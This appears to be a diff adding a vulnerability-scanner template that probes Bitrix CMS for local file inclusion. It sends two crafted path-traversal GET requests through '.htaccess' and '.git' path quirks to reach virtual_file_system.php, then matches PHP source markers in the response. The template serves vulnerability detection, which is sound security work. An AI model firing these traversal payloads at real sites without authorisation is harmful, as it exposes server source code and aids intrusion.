@@ -1,0 +1,48 @@
+id: bitrix-lfi-vfs
+
+info:
+  name: Bitrix Virtual File System LFI
+  author: JhonnyBonny
+  severity: high
+  description: |
+    Checks Bitrix virtual_file_system.php LFI via crafted path traversal
+    through .htaccess / .git path quirks.
+  reference:
+    - https://github.com/cr1f/writeups/blob/main/attacking_bitrix.pdf
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    max-request: 2
+  tags: bitrix,bitrix24,lfi,rce
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/.htaccess/тест/../..////////////////////////////bitrix//////////////////////////////virtual_file_system.php//////////////////////////////x/..'
+      - '{{BaseURL}}/.git/HEAD/пистолетики/../../../""""""""""""""""""""""""""""""/../bitrix/""""""""""""""""""""""""""""""/../virtual_file_system.php/""""""""""""""""""""""""""""""/../x/..'
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "virtual_file_system"
+          - "CFile"
+          - "Bitrix\\Main"
+          - "BX_FILE"
+          - "<?php"
+          - "$_SERVER"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "404 Not Found"
+          - "Страница не найдена"
+        negative: true
+        condition: or
